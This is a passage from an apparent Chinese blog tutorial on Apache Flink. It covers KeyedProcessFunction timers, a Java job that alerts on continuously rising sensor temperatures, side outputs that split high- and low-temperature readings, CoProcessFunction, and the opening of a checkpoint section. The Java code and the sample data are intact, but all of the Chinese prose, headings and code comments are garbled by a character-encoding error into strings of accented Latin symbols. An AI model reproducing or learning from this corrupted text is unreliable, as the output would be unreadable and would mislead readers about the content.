ä¼šæ³¨å†Œå½“å‰keyçš„processing timeçš„å®šæ—¶å™¨ã€‚å½“processing time åˆ°è¾¾å®šæ—¶æ—¶é—´æ—¶ï¼Œè§¦å‘timerã€‚ </li><li> <code>**void registerEventTimeTimer(long timestamp)**</code>** ä¼šæ³¨å†Œå½“å‰key çš„event time å®šæ—¶å™¨ã€‚å½“Watermarkæ°´ä½çº¿å¤§äºç­‰äºå®šæ—¶å™¨æ³¨å†Œçš„æ—¶é—´æ—¶ï¼Œè§¦å‘å®šæ—¶å™¨æ‰§è¡Œå›è°ƒå‡½æ•°ã€‚** </li><li> <code>void deleteProcessingTimeTimer(long timestamp)</code> åˆ é™¤ä¹‹å‰æ³¨å†Œå¤„ç†æ—¶é—´å®šæ—¶å™¨ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªæ—¶é—´æˆ³çš„å®šæ—¶å™¨ï¼Œåˆ™ä¸æ‰§è¡Œã€‚ </li><li> <code>void deleteEventTimeTimer(long timestamp)</code> åˆ é™¤ä¹‹å‰æ³¨å†Œçš„äº‹ä»¶æ—¶é—´å®šæ—¶å™¨ï¼Œå¦‚æœæ²¡æœ‰æ­¤æ—¶é—´æˆ³çš„å®šæ—¶å™¨ï¼Œåˆ™ä¸æ‰§è¡Œã€‚ </li></ul><pre><code>**å½“å®šæ—¶å™¨timer è§¦å‘æ—¶ï¼Œä¼šæ‰§è¡Œå›è°ƒå‡½æ•°onTimer()ã€‚æ³¨æ„å®šæ—¶å™¨timer åªèƒ½åœ¨keyed streams ä¸Šé¢ä½¿ç”¨ã€‚**</code></pre><h5 id="æµ‹è¯•ä»£ç -4"><a href="#æµ‹è¯•ä»£ç -4" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­è¯´æ˜KeyedProcessFunction å¦‚ä½•æ“ä½œKeyedStreamã€‚</p><p>éœ€æ±‚ï¼šç›‘æ§æ¸©åº¦ä¼ æ„Ÿå™¨çš„æ¸©åº¦å€¼ï¼Œå¦‚æœæ¸©åº¦å€¼åœ¨10 ç§’é’Ÿä¹‹å†…(processing time)è¿ç»­ä¸Šå‡ï¼Œåˆ™æŠ¥è­¦ã€‚</p><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 1:02 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest2_ApplicationCase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ä»socketä¸­è·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// è½¬æ¢æ•°æ®ä¸ºSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; sensorReadingStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// å¦‚æœå­˜åœ¨è¿ç»­10så†…æ¸©åº¦æŒç»­ä¸Šå‡çš„æƒ…å†µï¼Œåˆ™æŠ¥è­¦</span></span><br><span class="line">    sensorReadingStream.keyBy(SensorReading::getId)</span><br><span class="line">      .process(<span class="keyword">new</span> TempConsIncreWarning(Time.seconds(<span class="number">10</span>).toMilliseconds()))</span><br><span class="line">      .print();</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœå­˜åœ¨è¿ç»­10så†…æ¸©åº¦æŒç»­ä¸Šå‡çš„æƒ…å†µï¼Œåˆ™æŠ¥è­¦</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TempConsIncreWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">String</span>, <span class="title">SensorReading</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TempConsIncreWarning</span><span class="params">(Long interval)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.interval = interval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŠ¥è­¦çš„æ—¶é—´é—´éš”(å¦‚æœåœ¨intervalæ—¶é—´å†…æ¸©åº¦æŒç»­ä¸Šå‡ï¼Œåˆ™æŠ¥è­¦)</span></span><br><span class="line">    <span class="keyword">private</span> Long interval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸Šä¸€ä¸ªæ¸©åº¦å€¼</span></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Double&gt; lastTemperature;</span><br><span class="line">    <span class="comment">// æœ€è¿‘ä¸€æ¬¡å®šæ—¶å™¨çš„è§¦å‘æ—¶é—´(æŠ¥è­¦æ—¶é—´)</span></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Long&gt; recentTimerTimeStamp;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      lastTemperature = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Double&gt;(<span class="string">&quot;lastTemperature&quot;</span>, Double.class));</span><br><span class="line">      recentTimerTimeStamp = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;recentTimerTimeStamp&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      lastTemperature.clear();</span><br><span class="line">      recentTimerTimeStamp.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å½“å‰æ¸©åº¦å€¼</span></span><br><span class="line">      <span class="keyword">double</span> curTemp = value.getTemperature();</span><br><span class="line">      <span class="comment">// ä¸Šä¸€æ¬¡æ¸©åº¦(æ²¡æœ‰åˆ™è®¾ç½®ä¸ºå½“å‰æ¸©åº¦)</span></span><br><span class="line">      <span class="keyword">double</span> lastTemp = lastTemperature.value() != <span class="keyword">null</span> ? lastTemperature.value() : curTemp;</span><br><span class="line">      <span class="comment">// è®¡æ—¶å™¨çŠ¶æ€å€¼(æ—¶é—´æˆ³)</span></span><br><span class="line">      Long timerTimestamp = recentTimerTimeStamp.value();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœ å½“å‰æ¸©åº¦ &gt; ä¸Šæ¬¡æ¸©åº¦ å¹¶ä¸” æ²¡æœ‰è®¾ç½®æŠ¥è­¦è®¡æ—¶å™¨ï¼Œåˆ™è®¾ç½®</span></span><br><span class="line">      <span class="keyword">if</span> (curTemp &gt; lastTemp &amp;&amp; <span class="keyword">null</span> == timerTimestamp) &#123;</span><br><span class="line">        <span class="keyword">long</span> warningTimestamp = ctx.timerService().currentProcessingTime() + interval;</span><br><span class="line">        ctx.timerService().registerProcessingTimeTimer(warningTimestamp);</span><br><span class="line">        recentTimerTimeStamp.update(warningTimestamp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å¦‚æœ å½“å‰æ¸©åº¦ &lt; ä¸Šæ¬¡æ¸©åº¦ï¼Œä¸” è®¾ç½®äº†æŠ¥è­¦è®¡æ—¶å™¨ï¼Œåˆ™æ¸…ç©ºè®¡æ—¶å™¨</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (curTemp &lt;= lastTemp &amp;&amp; timerTimestamp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ctx.timerService().deleteProcessingTimeTimer(timerTimestamp);</span><br><span class="line">        recentTimerTimeStamp.clear();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// æ›´æ–°ä¿å­˜çš„æ¸©åº¦å€¼</span></span><br><span class="line">      lastTemperature.update(curTemp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šæ—¶å™¨ä»»åŠ¡</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// è§¦å‘æŠ¥è­¦ï¼Œå¹¶ä¸”æ¸…é™¤ å®šæ—¶å™¨çŠ¶æ€å€¼</span></span><br><span class="line">      out.collect(<span class="string">&quot;ä¼ æ„Ÿå™¨&quot;</span> + ctx.getCurrentKey() + <span class="string">&quot;æ¸©åº¦å€¼è¿ç»­&quot;</span> + interval + <span class="string">&quot;msä¸Šå‡&quot;</span>);</span><br><span class="line">      recentTimerTimeStamp.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨æœ¬åœ°socketï¼Œä¹‹åè¾“å…¥æ•°æ®  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><ul><li><p> è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,34.1</span><br><span class="line">sensor_1,1547718199,34.2</span><br><span class="line">sensor_1,1547718199,35.1</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_10,1547718205,39  </span><br><span class="line">sensor_6,1547718201,18  </span><br><span class="line">sensor_7,1547718202,9.1</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¼ æ„Ÿå™¨sensor_1æ¸©åº¦å€¼è¿ç»­10000msä¸Šå‡</span><br><span class="line">ä¼ æ„Ÿå™¨sensor_10æ¸©åº¦å€¼è¿ç»­10000msä¸Šå‡</span><br><span class="line">ä¼ æ„Ÿå™¨sensor_6æ¸©åº¦å€¼è¿ç»­10000msä¸Šå‡</span><br><span class="line">ä¼ æ„Ÿå™¨sensor_7æ¸©åº¦å€¼è¿ç»­10000msä¸Šå‡</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="ä¾§è¾“å‡ºæµï¼ˆSideOutputï¼‰"><a href="#ä¾§è¾“å‡ºæµï¼ˆSideOutputï¼‰" class="headerlink" title="ä¾§è¾“å‡ºæµï¼ˆSideOutputï¼‰"></a>ä¾§è¾“å‡ºæµï¼ˆSideOutputï¼‰</h4><ul><li><strong>ä¸€ä¸ªæ•°æ®å¯ä»¥è¢«å¤šä¸ªwindowåŒ…å«ï¼Œåªæœ‰å…¶ä¸è¢«ä»»ä½•windowåŒ…å«çš„æ—¶å€™(åŒ…å«è¯¥æ•°æ®çš„æ‰€æœ‰windowéƒ½å…³é—­ä¹‹å)ï¼Œæ‰ä¼šè¢«ä¸¢åˆ°ä¾§è¾“å‡ºæµã€‚</strong></li><li><strong>ç®€è¨€ä¹‹ï¼Œå¦‚æœä¸€ä¸ªæ•°æ®è¢«ä¸¢åˆ°ä¾§è¾“å‡ºæµï¼Œé‚£ä¹ˆæ‰€æœ‰åŒ…å«è¯¥æ•°æ®çš„windowéƒ½ç”±äºå·²ç»è¶…è¿‡äº†â€å…è®¸çš„è¿Ÿåˆ°æ—¶é—´â€è€Œå…³é—­äº†ï¼Œè¿›è€Œæ–°æ¥çš„è¿Ÿåˆ°æ•°æ®åªèƒ½è¢«ä¸¢åˆ°ä¾§è¾“å‡ºæµï¼</strong></li></ul><hr><ul><li> å¤§éƒ¨åˆ†çš„DataStream API çš„ç®—å­çš„è¾“å‡ºæ˜¯å•ä¸€è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯æŸç§æ•°æ®ç±»å‹çš„æµã€‚é™¤äº†split ç®—å­ï¼Œå¯ä»¥å°†ä¸€æ¡æµåˆ†æˆå¤šæ¡æµï¼Œè¿™äº›æµçš„æ•°æ®ç±»å‹ä¹Ÿéƒ½ç›¸åŒã€‚ </li><li> <strong>processfunction çš„side outputs åŠŸèƒ½å¯ä»¥äº§ç”Ÿå¤šæ¡æµï¼Œå¹¶ä¸”è¿™äº›æµçš„æ•°æ®ç±»å‹å¯ä»¥ä¸ä¸€æ ·ã€‚</strong> </li><li> ä¸€ä¸ªside output å¯ä»¥å®šä¹‰ä¸ºOutputTag[X]å¯¹è±¡ï¼ŒX æ˜¯è¾“å‡ºæµçš„æ•°æ®ç±»å‹ã€‚ </li><li> processfunction å¯ä»¥é€šè¿‡Context å¯¹è±¡å‘å°„ä¸€ä¸ªäº‹ä»¶åˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªside outputsã€‚ </li></ul><h5 id="æµ‹è¯•ä»£ç -5"><a href="#æµ‹è¯•ä»£ç -5" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p>åœºæ™¯ï¼šæ¸©åº¦&gt;=30æ”¾å…¥é«˜æ¸©æµè¾“å‡ºï¼Œåä¹‹æ”¾å…¥ä½æ¸©æµè¾“å‡º</p><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.ProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 2:07 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest3_SideOuptCase</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ä»æœ¬åœ°socketè¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªOutputTagï¼Œç”¨æ¥è¡¨ç¤ºä¾§è¾“å‡ºæµä½æ¸©æµ</span></span><br><span class="line">    <span class="comment">// An OutputTag must always be an anonymous inner class</span></span><br><span class="line">    <span class="comment">// so that Flink can derive a TypeInformation for the generic type parameter.</span></span><br><span class="line">    OutputTag&lt;SensorReading&gt; lowTempTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;lowTemp&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æµ‹è¯•ProcessFunctionï¼Œè‡ªå®šä¹‰ä¾§è¾“å‡ºæµå®ç°åˆ†æµæ“ä½œ</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; highTempStream = dataStream.process(<span class="keyword">new</span> ProcessFunction&lt;SensorReading, SensorReading&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;SensorReading&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ¸©åº¦ï¼Œå¤§äº30åº¦ï¼Œé«˜æ¸©æµè¾“å‡ºåˆ°ä¸»æµï¼›å°äºä½æ¸©æµè¾“å‡ºåˆ°ä¾§è¾“å‡ºæµ</span></span><br><span class="line">        <span class="keyword">if</span> (value.getTemperature() &gt; <span class="number">30</span>) &#123;</span><br><span class="line">          out.collect(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ctx.output(lowTempTag, value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    highTempStream.print(<span class="string">&quot;high-temp&quot;</span>);</span><br><span class="line">    highTempStream.getSideOutput(lowTempTag).print(<span class="string">&quot;low-temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœ¬åœ°å¯åŠ¨socket </p><ul><li><p> è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">high-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">low-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">low-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">high-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="CoProcessFunction"><a href="#CoProcessFunction" class="headerlink" title="CoProcessFunction"></a>CoProcessFunction</h4><ul><li> å¯¹äºä¸¤æ¡è¾“å…¥æµï¼ŒDataStream API æä¾›äº†CoProcessFunction è¿™æ ·çš„low-levelæ“ä½œã€‚CoProcessFunction æä¾›äº†æ“ä½œæ¯ä¸€ä¸ªè¾“å…¥æµçš„æ–¹æ³•: <code>processElement1()</code>å’Œ<code>processElement2()</code>ã€‚ </li><li> <strong>ç±»ä¼¼äºProcessFunctionï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½é€šè¿‡Context å¯¹è±¡æ¥è°ƒç”¨</strong>ã€‚è¿™ä¸ªContextå¯¹è±¡å¯ä»¥è®¿é—®äº‹ä»¶æ•°æ®ï¼Œå®šæ—¶å™¨æ—¶é—´æˆ³ï¼ŒTimerServiceï¼Œä»¥åŠside outputsã€‚ </li><li> <strong>CoProcessFunction ä¹Ÿæä¾›äº†onTimer()å›è°ƒå‡½æ•°</strong>ã€‚ </li></ul><h3 id="å®¹é”™æœºåˆ¶"><a href="#å®¹é”™æœºåˆ¶" class="headerlink" title="å®¹é”™æœºåˆ¶"></a>å®¹é”™æœºåˆ¶</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106433621">Flink-å®¹é”™æœºåˆ¶ | ä¸€è‡´æ€§æ£€æŸ¥ç‚¹ | æ£€æŸ¥ç‚¹åˆ°æ¢å¤çŠ¶æ€è¿‡ç¨‹ | Flinkæ£€æŸ¥ç‚¹ç®—æ³•(Chandy-Lamport) | ç®—æ³•æ“ä½œè§£æ | ä¿å­˜ç‚¹ç®€ä»‹</a></p></blockquote><h4 id="ä¸€è‡´æ€§æ£€æŸ¥ç‚¹-checkpoint"><a href="#ä¸€è‡´æ€§æ£€æŸ¥ç‚¹-checkpoint" class="headerlink" title="ä¸€è‡´æ€§æ£€æŸ¥ç‚¹(checkpoint)"></a>ä¸€è‡´æ€§æ£€æŸ¥ç‚¹(checkpoint)</h4><p><img src="https://img-blog.csdnimg.cn/2020052922013278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=cWV43&originHeight=318&originWidth=514&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> Flink æ•…éšœæ¢å¤æœºåˆ¶çš„æ ¸å¿ƒï¼Œå°±æ˜¯åº”ç”¨çŠ¶æ€çš„ä¸€è‡´æ€§æ£€æŸ¥ç‚¹ </li><li> æœ‰çŠ¶æ€æµåº”ç”¨çš„ä¸€è‡´æ£€æŸ¥ç‚¹ï¼Œå…¶å®å°±æ˜¯<strong>æ‰€æœ‰ä»»åŠ¡çš„çŠ¶æ€</strong>ï¼Œåœ¨æŸä¸ªæ—¶é—´ç‚¹çš„ä¸€ä»½æ‹·è´ï¼ˆä¸€ä»½å¿«ç…§ï¼‰ï¼›<strong>è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œåº”è¯¥æ˜¯æ‰€æœ‰ä»»åŠ¡éƒ½æ°å¥½å¤„ç†å®Œä¸€ä¸ªç›¸åŒçš„è¾“å…¥æ•°æ®çš„æ—¶å€™</strong><br><em>(5è¿™ä¸ªæ•°æ®è™½ç„¶è¿›äº†å¥‡æ•°æµä½†æ˜¯å¶æ•°æµä¹Ÿåº”è¯¥åšå¿«ç…§ï¼Œå› ä¸ºå±äºåŒä¸€ä¸ªç›¸åŒæ•°æ®ï¼Œåªæ˜¯æ²¡æœ‰è¢«ä»–å¤„ç†)</em><br><em>ï¼ˆè¿™é‡Œæ 